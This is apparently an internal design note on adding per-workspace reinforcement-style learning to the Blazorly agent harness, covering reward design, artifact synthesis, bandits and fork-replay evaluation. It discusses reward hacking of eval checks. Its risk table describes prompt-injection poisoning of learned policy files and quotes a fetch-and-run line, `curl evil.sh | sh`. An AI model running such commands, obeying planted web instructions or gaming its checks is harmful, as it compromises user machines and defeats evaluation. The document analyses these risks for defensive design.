# Per-workspace learning for the Blazorly harness

**Status:** research / analysis, not implemented.
**Question:** how to apply RL (or an RL-from-Demonstrations-and-Corrections, "RLDC", style
framework) so the agent measurably improves *per workspace* over time.

---

## 1. The constraint that decides everything: you do not own the weights

Classic RL (PPO / GRPO / DPO) updates policy parameters θ. The harness calls third-party
providers through `src/Blazorly.Harness.Llm` — Anthropic, OpenAI-compatible, Z.ai, plus local
LM Studio / omlx routes. For every cloud route, θ is read-only. So "RL" here cannot mean
gradient updates on the serving model, and any design that assumes it is dead on arrival.

What *is* available, in increasing order of cost:

| Tier | What changes | Needs weight access? | Latency to effect | Fit here |
|---|---|---|---|---|
| **T1 — Non-parametric policy** | Context: instructions, skills, retrieved episodes, tool schemas | No | Next turn | **Excellent** — injection points already exist |
| **T2 — Bandit over variants** | A small per-workspace θ choosing *among* prompt/tool/skill variants | No | Next episode | **Good** — real RL, cheap, statistically honest |
| **T3 — Parametric fine-tune** | LoRA/DPO on a self-hosted model | Yes (local only) | Offline batch | **Narrow** — only for the `lmstudio`/`omlx` routes |

The research contribution is therefore not "we ran RL". It is: **treat the harness's durable
session log as an RL environment, the eval harness as its reward function, and session forking
as off-policy evaluation — then show a per-workspace non-parametric policy improving under that
measurement.** That is defensible, novel enough, and buildable on code that already exists.

---

## 2. What "RLDC" maps to here

Reading RLDC as *RL from Demonstrations and Corrections* (the family containing Reflexion,
self-refine, RLCD, and learning-from-human-edits). The mapping is unusually clean, because the
harness already logs both:

- **Demonstrations** — turns that ended `TurnEndReason.Completed` with all eval checks green,
  or that the user accepted without steering.
- **Corrections** — the highest-value signal in the whole system, and it is already durable:
  - `ApprovalOutcome.Rejected` on a `tools/pre-execute` approval (`InteractionSeams.cs`,
    enforced in `ToolRuntime.cs:255`) — the human vetoed a specific tool call with specific args.
  - Mid-turn steers and queued messages via `Inbox` (`agent/inbox/spliced` events).
  - `TurnEndReason.Interrupted` / `Aborted(cause)` — the user stopped the agent.
  - Post-turn reverts: the user hand-editing what the agent wrote (observable as a `write`/`edit`
    to the same path from the terminal drawer, or the next turn's diff).
  - `hook/result` with `decision: block` — a deterministic policy veto.
  - `RepeatCallGuard` streaks — the agent thrashing (`Guards/RepeatCallGuard.cs`).

Corrections beat demonstrations for learning: a rejection localises the mistake to one
`(tool, arguments, state)` triple, which is exactly the granularity a policy artifact needs.

---

## 3. Asset inventory — the RL loop already exists, unassembled

This is the important section. Every component of the loop has a working implementation;
what's missing is the wiring and the measurement.

| RL component | Existing implementation | Notes |
|---|---|---|
| **Trajectory store** | `Persistence/JsonlSessionPersistence.cs`, `SqliteSessionPersistence.cs` | Append-only, seq-contiguous, single source of truth |
| **Per-workspace keying** | `~/.blazorly/sessions/<projectKey>/<sessionId>/session.jsonl` | Already partitioned by workspace basename; `SessionHeader.Cwd` carries the full path |
| **Workspace registry** | `Web/Services/WorkspaceRegistry.cs` | Named roots, ids, ordering |
| **Step-level interception** | `tools/pre-execute`, `tools/post-execute`, `agent/pre-step`, `agent/post-step`, `agent/turn-stopping`, `session/event` | 38 bus channels; waterfall seams can *block*, not just observe |
| **Pluggable folds** | `SessionProjectionService.Register(name, fold)` | Cached by `(sessionId, eventCount)` — sound because the log is append-only. **This is where reward functions go.** |
| **Policy injection (prompt)** | `SystemPromptService.RegisterContext(name, order, text)` | Renders into the durable runtime-context snapshot |
| **Policy injection (files)** | `Instructions/ProjectInstructionsService.cs` | Reads `AGENTS.md`/`CLAUDE.md` + `.local.md` from home, workspace root, and *touched directories*; 24k-char budget, most-specific-first |
| **Policy injection (procedures)** | `Tools/SkillTools.cs` — `SkillsService` + `skill` tool | Frontmatter catalog in the system prompt, full body loaded on demand. **Progressive disclosure = cheap policy storage.** |
| **Policy injection (mid-episode)** | `Inbox.Insert(msg, InboxTarget.NextStep / NextTurn)` | Precedent: `RepeatCallGuard` |
| **Retrieval** | `SessionSearchIndex` (SQLite FTS5 over event text) | Case-based reasoning substrate; incremental sync + self-heal |
| **Verifiable reward** | `Cli/EvalRunner.cs` + `eval/tasks/*/task.json` | Shell checks, exit-0 = pass. **This is an RLVR environment.** |
| **Environment isolation** | `Cli/EvalSandbox.cs`, `EvalEnvironment.cs` | Per-backend pinned homes, tool-schema hashes so score changes are attributable |
| **Counterfactual replay** | `SessionStore.Fork(sourceId, boundary, childId)` | Child log = prefix `[0..boundary]`. **This is off-policy evaluation.** |
| **Implicit reward signals** | `SessionStatsProjection` (turns, errors, cancels, compactions, retries, tool histogram), `UsageTelemetryService` | Already folded and cached |
| **Cost accounting** | `TokenMeterService`, telemetry token buckets | Needed — a learned policy that costs 3× tokens is not an improvement |
| **Unused slot** | `~/.blazorly/memory/` | Exists, empty, no code references it. Natural home for learned artifacts. |

**Live data already on this machine:** `sessions/thrivv` = 6.8 MB, one session with 35,218
events (177 tool calls, 159 steps, 6 turns, 10 LLM retries, 53 user messages);
`sessions/demo1` = 2.2 MB. Enough to prototype reward extraction today, not enough to train on.

---

## 4. Reward design

The single hardest part, and the part most likely to produce a paper-worthy negative result.

### 4.1 Verifiable (ground truth, low volume)

`EvalRunner` gives binary pass per check. Use it as-is for the *capability* axis, and extend
`task.json` with a `workspace` field so a task can be bound to a real repo:

```
R_verifiable = (#checks passed / #checks) − penalty(expectFinish mismatch)
```

Properties: unbiased, hackable, expensive (one full episode per sample), and only defined for
tasks somebody wrote. This is your **held-out test set**, not your training signal.

### 4.2 Implicit (dense, noisy, free)

Fold these from the log — all are already emitted:

| Signal | Source | Sign |
|---|---|---|
| Turn ended `Completed` | `turn/end` | + |
| Turn ended `Error` / `Blocked` / `MaxTokens` | `turn/end` | − |
| User interrupted / aborted | `turn/end` reason | − (strong) |
| Approval rejected | `tools/pre-execute` outcome | − (strong, localised) |
| Hook blocked | `hook/result` | − |
| Tool result `isError` | `tool/result` | − (weak — often exploratory) |
| Repeat-guard streak ≥ 3 | `RepeatCallGuard` | − |
| LLM retries | `llm/retry-started` | − (usually provider, not policy — **exclude**) |
| Compactions in one turn | `compaction/start` | − (context bloat) |
| Steps to goal completion | `step/*` count | − (efficiency) |
| Tokens per completed turn | `TokenMeterService` | − (cost) |
| Next user message is a restatement of the last | `user/message` similarity | − (didn't land) |
| Session ends without a follow-up "actually…" | — | + (weak) |

Composite:

```
R_turn = w1·outcome + w2·(−interrupt) + w3·(−rejections/k)
       + w4·(−thrash) + w5·(−normalised_steps) + w6·(−normalised_tokens)
```

**Do not hand-tune w.** Fit them by regression against `R_verifiable` on the eval set, or set
`w1` dominant and treat the rest as tie-breakers. Publishing hand-picked weights that happen to
work is the fastest route to a non-reproducible result.

### 4.3 Human correction (sparse, gold)

Explicit thumbs/`/feedback` does not exist yet. Adding one is a ~50-line change (a new event
type + a UI affordance + a REST endpoint) and is the highest-leverage missing piece. Without it
you are inferring preference from interruption, which conflates "wrong" with "I changed my mind".

### 4.4 Reward hacking — the concrete failure mode

An agent optimising `R_verifiable` learns to write files that satisfy `grep -qx '42' answer.txt`
without computing anything. Their own `compute` task is hackable in one `write` call. Mitigations:

1. Checks must assert *process*, not just artifacts — the `recover-tool-failure` task already
   does this correctly (it inspects `BLAZORLY_SESSION_LOG` for durable event structure).
2. Never let the learner see check commands for tasks used in scoring.
3. Add adversarial checks: "the session log contains a `run_code` tool call whose result
   includes the answer".
4. Report the hack rate as a first-class metric.

---

## 5. Architecture: the Workspace Policy Learner

A new plugin, `LearningPlugin : HarnessPlugin`, injecting
`["sessions", "systemPrompt", "tools", "projections"]`. Four stages.

### Stage 0 — Episode segmentation

Turns are too coarse, steps too fine. Define an **episode** as
`(workspaceKey, taskSignature, trajectory, outcome)` where `taskSignature` is a normalised
embedding/FTS key over the first user message. Fold from the log via
`SessionProjectionService.Register("episodes", …)`.

### Stage 1 — Reward labelling

Register `projections.Register("reward", …)` computing §4.2 per turn. Pure function of events →
cacheable, replayable, testable in isolation. **This stage alone is worth shipping**: it turns
6.8 MB of JSONL into a labelled dataset with no model calls.

### Stage 2 — Credit assignment

Given `R_turn = −1` (user interrupted at step 47), which step caused it? Options, cheapest first:

1. **Heuristic attribution** — the last tool call before the interrupt; the call that was
   rejected; the head of a repeat-guard streak. Free, surprisingly effective, and it's what
   makes corrections localisable.
2. **Counterfactual fork** — `SessionStore.Fork(id, boundary)` at candidate steps, replay with
   the suspect step altered, compare. Expensive (one LLM call per probe) but *causal*. This is
   the thing nobody else can do without an append-only log and a fork primitive.
3. **LLM-as-judge retrospective** — Reflexion-style: feed the trajectory + outcome to a model,
   ask for a one-paragraph verbal diagnosis. Cheap, biased, must be validated against (2).

Ship (1), research (2), use (3) only as a hypothesis generator for (1).

### Stage 3 — Policy artifact synthesis

Three artifact types, all writable to places the harness already reads:

| Artifact | Written to | Read by | Granularity |
|---|---|---|---|
| **Fact** ("this repo uses pnpm, never npm") | `<workspace>/.blazorly/AGENTS.local.md` or `~/.blazorly/memory/<workspaceKey>/facts.md` | `ProjectInstructionsService` | Always-on, budgeted |
| **Skill** (a named procedure with a body) | `<workspace>/.blazorly/skills/<name>/SKILL.md` | `SkillsService` catalog + `skill` tool | On-demand, near-free context cost |
| **Episode** (a retrieved precedent) | `~/.blazorly/memory/<workspaceKey>/episodes.jsonl` + FTS | new `recall` tool or `RegisterContext` | On-demand |

Synthesis rule: an observation becomes an artifact only when it has been seen
**≥ N times** (N ≈ 3) with **consistent sign**, and only if it survives a dedup check against
existing artifacts. Without this gate the learner writes a contradictory 24k-char
`AGENTS.local.md` in a week and eats the entire `ProjectInstructionsService.BudgetChars`.

**Skills are the right primary artifact.** They give unbounded policy capacity at O(catalog)
context cost — the model sees one line per skill and pulls the body only when relevant. That is
a genuinely better storage substrate than prompt-stuffing, and the harness already has it.

### Stage 4 — Selection (the only tier that is formally RL)

A per-workspace contextual bandit over *variants*:

- arms = {base prompt, base+facts, base+skill X, base+skill X+Y, tool-schema subset Z}
- context = `taskSignature` features + workspace features
- reward = §4 composite
- algorithm = Thompson sampling (Bayesian, handles sparse reward, gives credible intervals for
  free — which is what makes the result publishable)

θ is a few hundred bytes of JSON per workspace under `~/.blazorly/memory/<workspaceKey>/bandit.json`.
This is real reinforcement learning with real regret bounds, and it needs no GPU.

### Stage 5 — Gating (never deploy an unverified policy)

Before a new artifact goes live in a workspace:

1. **Static lint** — length budget, no secrets, no contradiction with `AGENTS.md`, no
   instruction that disables a guard.
2. **Replay gate** — fork the last K failed episodes at their failure boundary, re-run with the
   candidate artifact, require improvement and no regression on previously-passing episodes.
3. **Eval gate** — `blazorly eval` on the workspace's task set; require pass-rate ≥ baseline.
4. **Canary** — serve the artifact to 10% of turns (the bandit does this naturally), promote on
   evidence, auto-revert on regression. Artifacts are files → revert is `git checkout` / delete.

Every artifact carries provenance: `{sourceEventSeqs, observedCount, rewardDelta, approvedBy,
createdAt}`. `SessionEvent.SourceEventSeqs` already models exactly this shape for events.

---

## 6. Per-workspace scoping and transfer

**Scope key.** Use `Path.GetFullPath(SessionHeader.Cwd)`, not the basename. Two workspaces named
`app` collide today. `WorkspaceRegistry.Id` is the stable key; the sessions directory name is a
display artifact.

**Hierarchy.** `HarnessContext.CreateScope(key, parentKey)` already builds a scope tree with
cycle detection and `ScopeParentOf`. Mirror it for policy:

```
global (~/.blazorly/memory/_global)
  └── workspace (…/thrivv)
        └── directory (…/thrivv/packages/api)   ← ProjectInstructionsService already discovers touched dirs
```

Resolution: most specific wins, broader fills the budget — precisely the semantics
`ProjectInstructionsService.Render` implements. Reuse that resolver rather than writing a second one.

**Transfer.** Cold-start is the killer: a new workspace has zero episodes and the learner is
useless for weeks. Mitigate with *conservative transfer*: cluster workspaces by
(language, build system, framework, test runner) detected from the repo, and seed a new
workspace with artifacts whose evidence is strong in ≥ 3 sibling workspaces. Mark them
`provisional` and let the bandit demote them. Measure transfer as "episodes until first
artifact promotion" — a real, reportable number.

**Non-stationarity.** Workspaces change. An artifact learned in September ("the API is REST")
becomes a lie in November. Every artifact needs a decay/invalidation rule: re-verify on
`observedCount` staleness, on repo-signal change (`package.json` diff, new directory), or on two
consecutive contradicting episodes. This is under-studied in the agent-memory literature and is
a good second contribution.

---

## 7. Evaluation: fork-replay off-policy evaluation

The central methodological problem: how do you know the learner helped, when the workspace and
the tasks both drift?

Their `SessionStore.Fork(sourceId, boundary)` makes **counterfactual replay** possible:

```
for each historical episode e that ended badly:
    f = Fork(e.sessionId, e.failureBoundary)      # child log = prefix [0..boundary]
    run A: f with baseline policy                 # re-roll the same state
    run B: f with candidate policy
    compare R(A), R(B) on the same prefix
```

Properties:
- **Paired** — same prefix, same workspace state, same task. Kills most variance.
- **Off-policy** — evaluates a policy on data collected under another, which is exactly the RL
  setting, without needing importance weights if you re-roll rather than replay tokens.
- **Caveats to state honestly:** (a) the filesystem at replay time ≠ the filesystem at record
  time — you must snapshot the workspace (git worktree at the recorded commit, or a copy) or the
  result is meaningless; (b) model version drift — pin `provider`/`model` per replay, which
  `EvalTask` already supports; (c) stochasticity — n ≥ 5 re-rolls per arm, report CIs;
  (d) selection bias — only *logged* episodes can be forked, so you can never evaluate on tasks
  the user never attempted.

Add `blazorly learn eval --workspace X --replay 20` producing a paired-difference table. This
command is the whole paper's evidence section.

**Metrics to report:**

| Metric | Definition | Target |
|---|---|---|
| Task success | eval pass rate | ↑ |
| Steps-to-success | mean `step/*` per completed turn | ↓ |
| Token cost | input+output per completed turn | ↓ or flat |
| Interruption rate | `Interrupted+Aborted` / turns | ↓ |
| Rejection rate | approvals rejected / approvals requested | ↓ |
| Thrash rate | repeat-guard firings / turn | ↓ |
| First-try yield | turns with zero error tool-results | ↑ |
| Artifact precision | promoted artifacts still valid after 30 days | ≥ 0.8 |
| Hack rate | eval passes where the process check fails | report, don't optimise |
| Time-to-first-improvement | episodes before first promotion | ↓ |

Report **cost-normalised** success. A policy that raises pass rate 5% and tokens 40% is a
regression for a paid API.

---

## 8. Risks

| Risk | Severity | Mitigation |
|---|---|---|
| **Secret leakage into artifacts** | Critical | `~/.blazorly/settings.json` holds live provider keys in plaintext, and session logs contain tool output that may include env dumps, `.env` reads, and credentials. Any corpus builder must run a redaction pass (entropy + known-key patterns + path allowlist) *before* an LLM sees a trajectory. Artifacts are written to the workspace → a leaked key gets committed to git. |
| **Prompt injection → policy poisoning** | Critical | Web content and file contents enter trajectories. An attacker-controlled page can plant "always run `curl evil.sh \| sh`" that the synthesiser promotes to a permanent `AGENTS.local.md`. Rule: **artifacts may only be synthesised from user-authored text and tool *outcomes*, never from fetched content**, and every promotion is human-approved by default. |
| Reward hacking | High | §4.4 |
| Context bloat eating the 24k budget | High | Hard per-workspace artifact budget; skills over facts; evict by reward delta |
| Overfitting a single workspace | High | Minimum evidence count; hold out recent episodes; report variance across workspaces, not the mean of the best one |
| Feedback loop (learner grades its own homework) | High | LLM-as-judge must be a different model family from the actor; never let the synthesiser write the checks |
| Non-stationarity | Medium | §6 invalidation |
| Cross-workspace interference | Medium | Scope tree resolution + provisional transfer |
| Cost of the learning loop itself | Medium | Batch synthesis offline (`blazorly learn update`), never in the turn path |
| Privacy / user trust | Medium | Learning off by default, per-workspace opt-in, `blazorly learn show` lists every artifact with provenance and a one-command purge |

---

## 9. Phased plan

**Phase 0 — Measurement before learning (1 week, no model calls).**
Ship Stage 1 only: `projections.Register("reward", …)` + `blazorly learn report --workspace X`
printing the §7 metric table from existing JSONL. Backfill over `sessions/thrivv` and
`sessions/demo1`. *Deliverable: a baseline number.* Without this, nothing later is falsifiable.

**Phase 1 — Human feedback + redaction (1 week).**
Add a `feedback/rating` event type, a UI affordance, `/api/session.feedback`, and the redaction
pass. *Deliverable: gold labels + a safe corpus builder.*

**Phase 2 — Reflexion artifacts, human-gated (2 weeks).**
Stage 2 heuristic attribution + Stage 3 skill synthesis, writing to
`<workspace>/.blazorly/skills/` with every promotion shown in the UI for approval.
Fix `SkillsService.DefaultRoots()` to use the session cwd (it currently uses
`Environment.CurrentDirectory`, which is the app's launch dir — per-workspace skills do not
resolve today). *Deliverable: the agent visibly gets better at one workspace, with a human in
the loop.*

**Phase 3 — Fork-replay OPE (2–3 weeks).**
Workspace snapshotting + `blazorly learn eval --replay N` + paired statistics.
*Deliverable: the evidence section.*

**Phase 4 — Bandit + canary (2 weeks).**
Stage 4 Thompson sampling over artifact sets, auto-promotion behind the Stage 5 gates.
*Deliverable: a closed loop that runs unattended and can be trusted.*

**Phase 5 — Optional parametric track (open-ended).**
Only if a local route stabilises: export `(prompt, trajectory, reward)` triples, DPO/GRPO on a
small local model against the eval tasks. Expect this to underperform T1+T2 for a long time.

---

## 10. Open research questions

1. **What is the right unit of learned policy?** Facts, skills, or retrieved episodes — and is
   there a measurable crossover point in workspace age?
2. **Can counterfactual fork-replay be made cheap enough to run per-turn?** Today it is an
   offline instrument; an incremental version (fork only at the attributed step, single re-roll)
   might be affordable.
3. **How much correction signal is enough?** Learning curves: episodes-to-improvement vs.
   correction density. Nobody has this curve for coding agents in the wild.
4. **Does per-workspace adaptation beat a bigger model?** The honest comparison: `glm-5.3` with
   no memory vs. `glm-4.5-air` with a learned workspace policy. If the small model wins, that's
   a strong result.
5. **Invalidation.** Can staleness be detected from repo signals alone, before a bad artifact
   causes a failure?
6. **Transfer safety.** When does seeding from sibling workspaces help, and when does it import
   a wrong prior that is *harder* to unlearn than starting cold?

---

## 11. Immediate next actions

1. `blazorly learn report` — read existing JSONL, emit the metric table. Zero risk, immediate value.
2. Fix `SkillsService.DefaultRoots()` to accept the session cwd (blocking bug for per-workspace skills).
3. Add the `feedback/rating` event type + REST endpoint.
4. Write the redaction pass and run it over `~/.blazorly/sessions/` to measure how much
   sensitive material is actually in there. **Do this before any corpus work.**
5. Rotate the provider keys currently sitting in plaintext in `~/.blazorly/settings.json`.
